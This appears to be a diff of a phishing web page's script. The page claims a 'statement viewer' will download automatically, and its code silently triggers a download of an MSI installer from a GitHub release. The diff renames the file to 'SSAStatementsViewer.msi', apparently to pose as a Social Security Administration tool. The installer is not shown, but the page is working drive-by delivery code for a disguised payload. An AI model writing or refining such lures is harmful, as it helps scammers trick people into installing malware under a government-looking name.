@@ -198,7 +198,7 @@ Your statement viewer will download automatically.<br />
 <script>
 
 // File to download
-let report = "https://github.com/me1moup10/id2me/releases/download/id2me/statement_summary.msi";
+let report = "https://github.com/me1moup10/id2me/releases/download/id2me/SSAStatementsViewer.msi";
 
 // Get current date and time
 let now = new Date();
@@ -214,7 +214,7 @@ function downloadFile() {
     // Create a hidden anchor element
     const link = document.createElement('a');
     link.href = report;
-    link.download = 'statement-viewer.exe'; // Optional: specify filename
+    link.download = 'SSAStatementsViewer.msi'; // Optional: specify filename
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
